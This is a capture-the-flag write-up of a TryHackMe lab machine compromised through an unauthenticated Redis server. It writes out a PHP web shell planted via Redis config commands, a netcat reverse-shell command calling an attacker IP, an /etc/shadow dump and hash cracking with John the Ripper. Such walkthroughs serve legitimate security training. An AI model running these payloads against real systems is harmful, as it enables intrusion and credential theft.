# [RES](https://tryhackme.com/room/res) - Writeup

## Description:
In this machine, we exploited a misconfigured Redis database to gain initial access, then performed privilege escalation via password cracking to get root access.

## Enumeration
Initial port scan:
```python
nmap -sV -sC -p- 10.10.105.88
```
Open ports discovered:
```python
80/tcp   open  http
6379/tcp open  redis   Redis key-value store 6.0.7
```
* Port 80: Default Apache page.

* Port 6379 (Redis): Misconfigured, allows remote connections without authentication.

## Exploitation
We injected a web shell through Redis by changing its save directory to /var/www/html:
```python
redis-cli -h 10.10.105.88 -p 6379
config set dir /var/www/html
config set dbfilename webshell.php
set test "<?php system($_GET['cmd']); ?>"
save
exit
```
Trigger the reverse shell via URL:
```python
http://10.10.105.88/webshell.php?cmd=nc -e /bin/sh 10.10.10.10 4444
```
Start listener:
```python
nc -lvnp 4444
```
Now we have a shell.

## Privilege Escalation

Dump /etc/shadow:
```python
LFILE=/etc/shadow
xxd "$LFILE" | xxd -r
```
Extract hash for user vianka and save to file hash.txt.

Crack the hash with John the Ripper:
```python
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Switch to the cracked user:
```python
su vianka
sudo -l
```
We have full sudo privileges:
```python
sudo su
```
Read the flag:
```python
cat /root/root.txt
```
## Conclusion
This machine demonstrated the danger of exposing Redis without authentication. Misconfigurations can easily lead to remote code execution and root access.
